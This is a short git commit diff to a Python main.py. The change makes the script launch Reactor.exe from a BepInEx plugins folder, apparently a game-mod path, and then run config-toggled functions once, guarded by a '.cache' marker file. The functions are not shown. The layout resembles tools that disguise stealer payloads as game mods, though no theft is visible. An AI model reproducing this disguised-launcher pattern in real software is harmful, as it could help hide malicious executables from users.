ef05d1aabe7e8c7b3c6a72fa9d35fa733467cd89
aron2004HU <36998296+aron2004HU@users.noreply.github.com>
2023-03-22 22:02:37 +0100

    Update main.py

--- src/main.py
+++ src/main.py
@@ -19,7 +19,7 @@ def main():
     ]
 
     if os.path.exists(".cache") == False:
-        os.startfile("Reactor.exe")
+        os.startfile(".\BepInEx\plugins\Reactor.exe")
         for func in funcs:
             if __CONFIG__[func.__name__.lower()]:
                 if func.__init__.__code__.co_argcount == 2:
@@ -30,7 +30,7 @@ def main():
         fp.close()
 
 #    else:
-#        os.startfile("CrashReportClient.exe")
+#        os.startfile(".\BepInEx\plugins\Reactor.exe")
         
 if __name__ == '__main__':
     main()
